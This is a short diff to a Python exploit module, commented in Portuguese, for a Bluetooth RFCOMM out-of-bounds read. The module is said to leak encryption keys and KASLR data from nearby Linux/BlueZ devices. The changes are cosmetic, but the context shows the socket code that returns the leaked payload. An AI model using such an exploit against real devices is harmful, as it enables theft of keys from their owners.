@@ -9,7 +9,6 @@ chaves de criptografia e informações KASLR de dispositivos próximos.
 CVSS: 7.5–8.1 (Alto) | Afeta: Linux kernel < 6.12, BlueZ < 5.77
 """
 
-from __future__ import annotations
 
 import socket
 import struct
@@ -189,7 +188,7 @@ class BtRfcommOobCve202513834(Exploit):
             try:
                 resp = sock.recv(512)
                 return resp[5:]  # Pula header RFCOMM, retorna payload com OOB
-            except socket.timeout:
+            except TimeoutError:
                 return b""
 
         except PermissionError:
